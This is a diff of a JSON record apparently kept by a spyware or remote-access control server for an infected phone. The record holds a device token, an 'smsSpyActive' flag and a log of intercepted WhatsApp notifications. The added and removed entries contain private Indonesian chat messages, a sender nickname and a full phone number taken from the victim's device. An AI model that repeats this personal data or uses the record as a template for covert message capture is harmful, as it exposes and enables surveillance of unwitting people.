@@ -4,7 +4,7 @@
     "deviceName": "HP-PEW-3BFE",
     "ownerUsername": "Youbie",
     "token": "00613901ddb20be7b9614da5e8ef8e90",
-    "lastSeen": 1776914591172,
+    "lastSeen": 1776914621025,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-22T07:08:58.851Z",
@@ -20,6 +20,22 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "WhatsApp",
+        "content": "‎‎64 pesan dari 40 chat",
+        "time": "23/04 11:23",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776914622009
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "prily 🤍",
+        "content": "susu nya mahal mahal lgi",
+        "time": "23/04 11:23",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776914621900
+      },
       {
         "appName": "WhatsApp",
         "sender": "WhatsApp",
@@ -4003,22 +4019,6 @@
         "time": "23/04 05:06",
         "pkg": "com.whatsapp",
         "receivedAt": 1776891984948
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "prily 🤍",
-        "content": "tpi merah aja bagus",
-        "time": "23/04 05:06",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776891984807
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "+62 823-1199-7104",
-        "content": "Balik sore kmr16 kemarin aku kasih di kmr17",
-        "time": "23/04 05:06",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776891973345
       }
     ],
     "galleryPhotos": [],
